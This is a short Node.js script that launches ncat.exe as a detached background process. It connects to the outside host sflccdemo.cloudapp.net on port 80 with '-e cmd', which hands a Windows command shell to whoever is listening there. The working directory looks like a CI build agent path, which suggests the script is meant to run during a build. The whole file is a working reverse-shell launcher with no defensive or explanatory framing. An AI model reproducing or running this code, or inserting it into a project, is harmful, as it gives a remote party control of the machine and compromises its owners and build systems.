const fs = require('fs');
const http = require('http');

const out = fs.openSync('out.log', 'a');
const err = fs.openSync('out.log', 'a');

var spawn = require('child_process').spawn;
var cmd = 'ncat.exe';

const child = spawn(cmd, ['sflccdemo.cloudapp.net', '80','-e', 'cmd'], {
  detached: true,
  cwd: 'c:\\a\\1\\s\\jamdavi-console\\jamdavi-console\\',
  stdio: [ 'ignore', out, err ]
});

child.unref();
